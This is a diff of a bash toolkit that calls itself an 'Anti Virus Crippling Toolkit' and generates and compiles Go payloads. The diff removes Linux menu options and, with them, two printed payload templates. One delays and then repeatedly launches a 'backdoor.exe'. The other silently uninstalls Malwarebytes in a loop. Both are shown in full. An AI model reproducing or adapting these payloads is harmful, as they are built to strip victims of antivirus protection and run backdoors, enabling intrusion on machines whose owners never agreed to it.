@@ -1,6 +1,6 @@
 #!/bin/bash
 clear
-echo -e "NOGO (The Anti Virus Crippling Toolkit)"
+echo "NOGO (The Anti Virus Crippling Toolkit)"
 echo ""
 echo "Credits:"
 echo "~ drno"
@@ -69,7 +69,7 @@ while true; do
   echo ""
   echo ""
 #check opsystm
-  echo "Enter prefered operating system - 1) Windows - 2) Linux"
+  echo "Enter prefered operating system - 1) Windows"
   echo ""
 #check opsystm logic
     while true; do
@@ -128,24 +128,14 @@ EOF
 #del org file
 	  rm $PWD/output.go
         break
-      elif [ "$opsys" = "2" ]; then
-	if [ -e "output.go" ]; then
-	  echo "File output.go already exists!"
-	else
-#FAVT - lin
-	  echo "" > output.go
-	  cat > output.go <<EOF
-
-
-EOF
-	  echo "File saved to" $PWD
-#compile to elf
-	  env GOOS=linux GOARCH=amd64 go build $PWD/output.go
-	fi
 #del org file
 	  rm $PWD/output.go
         break
       else
+	echo "That's not an option!"
+	echo ""
+        echo "Enter prefered operating system - 1) Windows"
+        echo ""
         continue
       fi
     done
@@ -154,7 +144,7 @@ EOF
   echo ""
   echo ""
 #check opsystm
-  echo "Enter prefered operating system - 1) Windows - 2) Linux"
+  echo "Enter prefered operating system - 1) Windows"
   echo ""
 #check opsystm logic
     while true; do
@@ -190,38 +180,14 @@ EOF
 #del org file
 	  rm $PWD/output.go
         break
-      elif [ "$opsys" = "2" ]; then
-	if [ -e "output.go" ]; then
-	  echo "File output.go already exists!"
-	else
-#TMPS - lin
-	  echo "" > output.go
-	  cat > output.go <<EOF
-package main
-
-import (
-	"os/exec"
-	"time"
-)
-
-func main() {
-	time.Sleep(4 * time.Minute)	
-	for i := 0; i < 50; i++ {	
-		cmd := exec.Command("cmd", "/C", "start", "/b", "backdoor.exe")
-		if err := cmd.Run(); err != nil {
-			panic(err.Error())
-		}
-	}
-}
-EOF
-	  echo "File saved to" $PWD
-#compile to elf
-	  env GOOS=linux GOARCH=amd64 go build $PWD/output.go
-	fi
 #del org file
 	  rm $PWD/output.go
         break
       else
+	echo "That's not an option!"
+	echo ""
+        echo "Enter prefered operating system - 1) Windows"
+        echo ""
         continue
       fi
     done
@@ -230,7 +196,7 @@ EOF
   echo ""
   echo ""
 #check opsystm
-  echo "Enter prefered operating system - 1) Windows - 2) Linux"
+  echo "Enter prefered operating system - 1) Windows"
   echo ""
 #check opsystm logic
     while true; do
@@ -271,49 +237,21 @@ EOF
 #del org file
 	  rm $PWD/output.go
         break
-      elif [ "$opsys" = "2" ]; then
-	if [ -e "output.go" ]; then
-	  echo "File output.go already exists!"
-	else
-#TMPS - lin
-	  echo "" > output.go
-	  cat > output.go <<EOF
-package main
-
-import (
-	"os/exec"
-	"time"
-	"os"
-)
-
-func main() {
-	for {
-		time.Sleep(30 * time.Second)		
-		
-		mal := exec.Command("cmd", "/C", "C:\\Program Files\\Malwarebytes\\Anti-Malware\\unins000.exe", "/verysilent", "/suppressmsgboxes", "/norestart")
-
-		if _, err := os.Stat("C:\\Program Files\\Malwarebytes\\Anti-Malware\\"); err == nil {
- 			mal.Run()
-		}
-		
-
-	}
-}
-EOF
-	  echo "File saved to" $PWD
-#compile to elf
-	  env GOOS=linux GOARCH=amd64 go build $PWD/output.go
-	fi
 #del org file
 	  rm $PWD/output.go
         break
       else
+	echo "That's not an option!"
+	echo ""
+        echo "Enter prefered operating system - 1) Windows"
+        echo ""
         continue
       fi
     done
     break
 #else check
   else
+  clear
   echo "That's not an option!"
   echo ""
   echo "Select payload:"
